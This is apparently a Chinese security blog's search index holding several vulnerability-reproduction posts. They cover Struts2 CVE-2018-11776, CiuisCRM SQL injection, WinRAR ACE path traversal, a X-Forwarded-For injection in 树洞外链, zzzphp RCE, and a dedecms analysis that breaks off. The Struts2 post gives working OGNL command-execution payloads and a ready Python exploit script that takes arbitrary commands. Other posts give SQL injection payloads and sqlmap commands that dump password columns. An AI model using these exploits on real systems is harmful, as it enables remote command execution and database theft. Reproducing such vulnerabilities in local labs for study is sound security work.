<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2018-11776漏洞复现</title>
      <link href="/2019/08/02/cve-2018-11776-lou-dong-fu-xian/"/>
      <url>/2019/08/02/cve-2018-11776-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>2018年8月23日，ApacheStrust2发布最新安全公告，ApacheStruts2 存在远程代码执行的高危漏洞，该漏洞由SemmleSecurity Researchteam的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）。</p><p>定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行。<br>URL标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行，以及系统命令到服务器系统中去 。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>Apache struts 2.3-Apache struts 2.3.34</p><p>Apache struts 2.5-Apache struts 2.5.16 </p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li>windows 10</li><li>jdk1.8.0_191</li><li>apache-tomcat-7.0.96</li><li>struts-2.3.34</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先安装jdk，并配置环境变量，不再赘述</p><p>下载 <a href="https://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">apache-tomcat</a> 并解压<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802122817.png" alt></p><p>下载 <a href="http://archive.apache.org/dist/struts/2.3.34/" target="_blank" rel="noopener">Struts-2.3.34</a> 解压，并将apps目录下的 <code>struts2-showcase.war</code> 复制到tomcat的webapps目录下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123100.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123449.png" alt></p><p>在tomcat下bin目录下运行startup.bat脚本来启动tomcat，启动后自动部署struts2<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123719.png" alt></p><p>浏览器访问 <code>http://127.0.0.1:8080/struts2-showcase</code>，出现如下界面即为部署成功了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123957.png" alt></p><p>正常部署完成struts如上所示，但为了复现struts2-057漏洞，需要修改如下两个文件（tomcat目录下）</p><ul><li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\src\java\struts-actionchaining.xml</li><li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\classes\struts-actionchaining.xml</li></ul><p>注释掉原来的xml代码，修改如下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802124843.png" alt></p><pre><code>&lt;struts&gt;    &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;        &lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;            &lt;result type=&quot;redirectAction&quot;&gt;            &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt;            &lt;/result&gt;            &lt;/action&gt;        &lt;action name=&quot;actionChain2&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain2&quot;&gt;            &lt;result type=&quot;chain&quot;&gt;actionChain3&lt;/result&gt;        &lt;/action&gt;        &lt;action name=&quot;actionChain3&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain3&quot;&gt;            &lt;result&gt;/WEB-INF/actionchaining/actionChainingResult.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;</code></pre><p>在tomcat下bin目录下运行shutdown.bat，startup.bat脚本来重启tomcat。<br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br>浏览器访问<code>http://192.168.10.230:8080/struts2-showcase/</code>,漏洞环境成功搭建</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在URL构造ognl表达式，再加上配置文件中的action标签中的name属性值，并以.action结尾<br><code>http://127.0.0.1:8080/struts2-showcase/${(50+50)}/actionChain1.action</code><br>执行完成之后发现跳转到了<br><code>http://127.0.0.1:8080/struts2-showcase/100/register2.action</code><br>执行了ognl 表达式 ${(50+50)},漏洞存在</p><p>进一步利用漏洞，弹出计算器，构造payload</p><pre><code>${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))}</code></pre><p>进行URL编码 </p><pre><code>%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d</code></pre><p>拼接</p><pre><code>127.0.0.1:8080/struts2-showcase/%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d/actionChain1.action</code></pre><p>成功执行<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802131043.png" alt></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#coding: utf-8import requestsimport sysdef expliot(host, command, path):    &#39;&#39;&#39;    2.3.34版本    payload1:    ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    2.3.20版本    payload2:    ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    &#39;&#39;&#39;    str1 = &quot;${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot;+command+&quot;&#39;).getInputStream()))).(#w.close())}&quot;    str1 = str1.encode(&#39;hex&#39;)    str2 = &quot;${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot;+command+&quot;&#39;).getInputStream()))).(#w.close())}&quot;    str2 = str2.encode(&#39;hex&#39;)    #需要进行URL编码    payload1 = &quot;&quot;    for i in range(0,len(str1),2):        payload1 += &#39;%&#39;+str1[i:i+2]    payload2 = &quot;&quot;    for i in range(0,len(str2),2):        payload2 += &#39;%&#39;+str2[i:i+2]    url1 = host+&#39;/&#39;+payload1+&#39;/&#39;+path    url2 = host+&#39;/&#39;+payload2+&#39;/&#39;+path    res1 = requests.get(url1, allow_redirects=False)    res2 = requests.get(url2, allow_redirects=False)    if res1.status_code == 200 and res2.status_code != 200:        print &quot;Exploit successful:&quot;    print res1.content    elif res2.status_code == 200 and res1.status_code != 200:    print &quot;Exploit successful:&quot;    print res2.content    else:    print(&#39;The target is likely unvulnerable,mabye your struts2 version is too high!&#39;)if __name__ == &#39;__main__&#39;:    if len(sys.argv) &lt; 4:        print(&quot;Usage: python2 struts2.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}&quot;)    else:        expliot(sys.argv[1].strip(), sys.argv[2], sys.argv[3].strip())</code></pre><p>使用方法：</p><p><code>python2 struts2.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}</code></p><p>例如:<br><code>python2 struts2.py http://192.168.50.197:8080/struts2-showcase/ &quot;ipconfig&quot; actionChain1.action</code></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://www.cuittk.cn/2019/01/02/CVE-2018-11776漏洞从搭建到复现/" target="_blank" rel="noopener">CVE-2018-11776漏洞从搭建到复现</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> CVE-2018-11776 </tag>
            
            <tag> struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ciuis CRM 1.6 - &#39;eventType&#39; SQL Inj.复现</title>
      <link href="/2019/08/01/ciuiscrm-1.6-eventtype-sql-inj.fu-xian/"/>
      <url>/2019/08/01/ciuiscrm-1.6-eventtype-sql-inj.fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h1><pre><code>===========================================================================================# Exploit Title: CiuisCRM 1.6 - &#39;eventType&#39; SQL Inj.# Dork: N/A# Date: 27-05-2019# Exploit Author: Mehmet EMİROĞLU# Vendor Homepage: https://codecanyon.net/item/ciuis-crm/20473489# Software Link: https://codecanyon.net/item/ciuis-crm/20473489# Version: v1.6# Category: Webapps# Tested on: Wamp64, Windows# CVE: N/A# Software Description: Ciuis CRM you can easily manage your customer relationships and save time on your business.===========================================================================================# POC - SQLi# Parameters : eventType# Attack Pattern :-1+or+1%3d1+and(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)# POST Method : http://localhost/ciuiscrm-16/calendar/addevent===========================================================================================</code></pre><hr><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>下载Ciuis CRM 1.6，搭建本地环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175019.png" alt></p><p>点击CALENDAR，然后点添加按钮<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175107.png" alt></p><p>随便填入东西，使用burpsuite抓包<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175408.png" alt></p><p>在<code>eventType=1</code>后面添加单引号，发包，出现报错信息，存在注入点<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175628.png" alt></p><p>将请求信息保存下来（ciuis.txt）用sqlmap跑</p><p><code>python sqlmap.py -r F:\Desktop\ciuis.txt</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181356.png" alt></p><p>查数据库<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt --dbs</code></p><p>查表<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis --tables</code></p><p>查字段<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis -T tags --columns</code></p><p>dump出指定字段<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis -T tags -C id,password --dump</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181516.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181614.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://exploit.kitploit.com/2019/07/ciuiscrm-16-sql-injection.html" target="_blank" rel="noopener">CiuisCRM 1.6 SQL Injection</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> Ciuis CRM 1.6 </tag>
            
            <tag> SQL Inj. </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinRAR目录穿越漏洞复现</title>
      <link href="/2019/07/26/winrar-mu-lu-chuan-yue-lou-dong-fu-xian/"/>
      <url>/2019/07/26/winrar-mu-lu-chuan-yue-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，<br>没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。<br>而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，<br>将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p><hr><h1 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h1><p><strong>影响版本：</strong><br>       * WinRAR &lt; 5.70 Beta 1<br>       * Bandizip &lt; = 6.2.0.0<br>       * 好压(2345压缩) &lt; = 5.9.8.10907<br>       * 360压缩 &lt; = 4.0.0.1170<br>       * ……</p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>新建一个任意文件，名称类型内容随意<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155542.png" alt></p><p>使用Winace进行压缩<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155906.png" alt></p><p>然后下载<a href="https://github.com/droe/acefile/blob/master/acefile.py" target="_blank" rel="noopener">acefile.py</a>脚本<br>输入命令<code>python acefile.py --headers test.ace</code> 读取文件的头部信息<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160308.png" alt></p><p>ok，开始构造恶意文件<br>用 010Editor 打开test.ace文件<br>需要修改以下参数：</p><ul><li>hdr_crc</li><li>hdr_size</li><li>filename的长度</li><li>filename<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160517.png" alt><br>首先将filename的值改为 <code>d:\d:\liehu.txt</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161040.png" alt></li></ul><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161237.png" alt></p><p>修改后的filename的长度，选中它，左下角就是它的长度15，16进制为00 0F，filename的前两位就是它的长度<br>修改顺序是由后到前，即将10改为0F即可<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161841.png" alt></p><p>修改<strong>hdr_size</strong>，选中如下位置，左下角查看其长度，这里是（00 2E），选中的前面的红框就是hdr_size<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162147.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162439.png" alt></p><p>最后修改<strong>hdr_crc</strong>，再次运行<br><code>python acefile.py --headers test.ace</code><br>CRC校验失败，报错<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162831.png" alt><br>在acefile.py文件中查找 <code>header CRC failed</code><br>在其上面一行添加输出语句，输出ace_crc16(buf)，即为我们需要的<strong>hdr_crc</strong>的值<br><code>print (ace_crc16(buf), buf)</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163206.png" alt></p><p>改好保存，再次运行<br><code>python acefile.py --headers test.ace</code><br>31102即我们需要的值，转换成16进制为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163625.png" alt></p><p>将<strong>hdr_size</strong> 前面的两位即为<strong>hdr_crc</strong>，从右到左修改为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164206.png" alt></p><p>再次运行<br><code>python acefile.py --headers test.ace</code><br>输出如下信息无报错，就成功了，用开头所述解压工具解压test.ace，就会在红框的路径生成对应的文件。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164506.png" alt></p><hr><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ol><li>升级最新的WinRAR ，目前版本是 5.71 </li><li>winRAR安装目录下，删除UNACEV2.dll文件</li></ol><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/" target="_blank" rel="noopener">WinRAR漏洞复现过程</a><br><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">Extracting a 19 Year Old Code Execution from WinRAR - Check Point Research</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> WinRAR </tag>
            
            <tag> 目录穿越 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树洞外链X_FORWARDED_FOR注入漏洞复现</title>
      <link href="/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/"/>
      <url>/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>树洞外链现在已经停止更新，作者又开发了<a href="https://github.com/cloudreve/Cloudreve" target="_blank" rel="noopener">Cloudreve</a>，有兴趣可以了解一下。<br>回归正题，虽然树洞已经停止更新了，还是可以做一些研究学习。<br>树洞外链存在X_FORWARDED_FOR注入漏洞，最新版本的已经修复了，2.2.1版本的可以复现。</p><hr><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p>在<code>/includes/function.php</code>的37行左右，获取了X_FORWARDED_FOR，并未做防注入过滤 </p><pre><code>function get_real_ip(){$ip=false;if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;])){$ip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];}if (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {$ips = explode (&quot;, &quot;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }for ($i = 0; $i &lt; count($ips); $i++) {if (!eregi (&quot;^(10|172\.16|192\.168)\.&quot;, $ips[$i])) {$ip = $ips[$i];break;}}}return ($ip ? $ip : $_SERVER[&#39;REMOTE_ADDR&#39;]);}</code></pre><p>然后在<code>includes/save.php</code>  20行左右发现调用<code>get_real_ip()</code>函数</p><pre><code>$ip=get_real_ip();$dd=date(&#39;Y-m-d H:i:s&#39;);$rand = md5(time() . mt_rand(0,1000));$stmt = $con-&gt;prepare(&quot;INSERT INTO  `$sqlname`.`sd_file` (`ming` ,`key1` ,`uploadip` ,`uploadtime` ,`cishuo` ,`upuser` ,`policyid`)VALUES (?, &#39;$rand&#39;, &#39;$ip&#39;, &#39;$dd&#39;, &#39;0&#39; , &#39;$uploadUser&#39;, &#39;$policyId&#39;);&quot;);$stmt-&gt;bind_param(&#39;s&#39;, $ming);</code></pre><hr><h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><p>下载树洞外链源码，本地搭建环境。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726110921.png" alt></p><p>注册账号登陆，然后打开burpsuite，关掉拦截<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111147.png" alt><br>然后上传文件，在HTTP history里找到<code>/includes/save.php</code>,发送到Repeater<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111306.png" alt><br>构造payload并发送</p><pre><code>X-Forwarded-For: 1.1.1.1′,user(),’0′,1,1); #ming=aa</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111644.png" alt></p><p>然后在<strong>我的文件</strong>里面可以看到执行结果<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111744.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/179363.html" target="_blank" rel="noopener">代码审计树洞X_FORWARDED_FOR注入</a><br><a href="https://blog.csdn.net/qq_21510303/article/details/91886405" target="_blank" rel="noopener">代码审计之头部注入X-Forwarded-For</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> 树洞外链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zzzphp V1.6.1 远程代码执行漏洞复现</title>
      <link href="/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/"/>
      <url>/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，<br>导致在后台可以写入php代码从而造成代码执行。</p><hr><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>本地搭建zzzphp V1.6.1环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141219.png" alt></p><p>在后台模块管理中的电脑模块找到cn2016<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141335.png" alt></p><p>然后在cn2016文件中到html文件，然后在html文件中找到search.html，然后将其的代码修改为<br><code>{if:assert($_request[phpinfo()])}phpinfo();{end if}</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141523.png" alt></p><p>然后打开<code>http://xxx/zzzcms/search/</code>就可以看到我们刚刚输入的phpinfo()执行了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141748.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/4471" target="_blank" rel="noopener">zzzphp V1.6.1 远程代码执行漏洞分析</a><br><a href="https://www.anquanke.com/post/id/173991" target="_blank" rel="noopener">zzzphpV1.6.1 远程代码执行漏洞简单分析</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> zzzphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedecms V5.7-UTF-8-SP2 命令执行漏洞复现</title>
      <link href="/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724101304.png" alt></p><hr><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p>环境搭建这里不再赘述，搭建好后访问网站主页<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102343.png" alt></p><p>dedecms默认的后台是/dede,没有修改直接访问登陆<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102453.png" alt></p><p>根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102828.png" alt></p><p><strong>代码分析</strong></p><pre><code>(1)此处定义了一个savetagfile的函数，首先做一个判断，参数“action”是否等于savetagfile，如果等于，就进行下一步(2)csrf_chack(),这里有一个csrf检验的函数，我们需要加上token来绕过，token是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。(3)正则表达式匹配，详情参见https://www.runoob.com/regexp/regexp-rule.html*   [a-z0-9_-]{1,}的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的\.意思是匹配小数点   